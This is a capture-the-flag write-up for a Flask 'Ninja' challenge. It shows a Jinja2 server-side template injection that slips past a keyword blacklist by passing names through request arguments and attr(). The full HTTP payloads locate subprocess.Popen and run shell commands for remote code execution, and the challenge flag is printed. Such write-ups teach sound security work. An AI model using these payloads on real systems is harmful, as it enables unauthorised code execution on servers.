<hr />

<h2>description: Flask Server-Side Template Injection (SSTI)</h2>

<h1>Ninja</h1>

<h2>Description</h2>

<p>Hey guys come check out this website I made to test my ninja-coding skills.</p>

<p>http://web.chal.csaw.io:5000</p>

<h2>Solution</h2>

<p>The webpage is vulnerable to a Server-Side Template Injection (SSTI) vulnerability.</p>

<p>However, there are a few restrictions. Using any of the blacklisted words will yield the following error:</p>

<blockquote>
  <p>Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base</p>
</blockquote>

<h3>Filter Bypass</h3>

<p>I found this <a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">excellent tutorial</a> on how to bypass Jinja2 SSTI filters. Basically, we can pass in any of the blacklisted characters as GET request arguments, then access them through <code>request.args</code>.</p>

<p>This allows us to pass them into <code>attr()</code>, which is a Jinja2 <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#builtin-filters">built-in filter</a> that gets an attribute of an object. <code>foo|attr("bar")</code> is equivalent to  <code>foo.bar</code>.</p>

<p>The following payload:</p>

<p><code>/submit?value={{()|attr(request.args.c)}}&amp;c=__class__</code></p>

<p>will result in <code>().__class__</code> being evaluated and shown to the user.</p>

<h3>Finding subprocess.Popen</h3>

<p>To get the subclasses, we do <code>().__class__.__base__.__subclasses__()</code>.</p>

<p><code>http
GET /submit?value={{()|attr(request.args.c)|attr(request.args.b)|attr(request.args.s)()}}&amp;c=__class__&amp;b=__base__&amp;s=__subclasses__ HTTP/1.1
Host: web.chal.csaw.io:5000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://web.chal.csaw.io:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
</code></p>

<p>I copied the output and used the following script to find <code>&lt;class 'subprocess.Popen'&gt;</code> in the subclasses. The index was 258.</p>

<p><code>python
check = "..."
for index,value in enumerate(check.split(',')):
    if "subprocess.Popen" in value:
        print(index)
</code></p>

<p>We are subsequently able to access this index to obtain RCE through <code>subprocess.Popen</code>.</p>

<h3>RCE</h3>

<p>With access to <code>subprocess.Popen</code>, we simply have to leverage it to achieve RCE. </p>

<p><code>http
GET /submit?value={{()|attr(request.args.c)|attr(request.args.b)|attr(request.args.s)()|attr(request.args.g)(258)('ls',shell=True,stdout=-1)|attr('communicate')()|attr(request.args.g)(0)|attr('decode')('utf-8')}}&amp;c=__class__&amp;b=__base__&amp;s=__subclasses__&amp;g=__getitem__ HTTP/1.1
Host: web.chal.csaw.io:5000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://web.chal.csaw.io:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
</code></p>

<p>Finally, <code>cat flag.txt</code> gives us the flag!</p>

<p><img src="../../.gitbook/assets/image (76).png" alt="" /></p>

<p>The flag is <code>flag{m0mmy_s33_1m_4_r34l_n1nj4}</code>.</p>
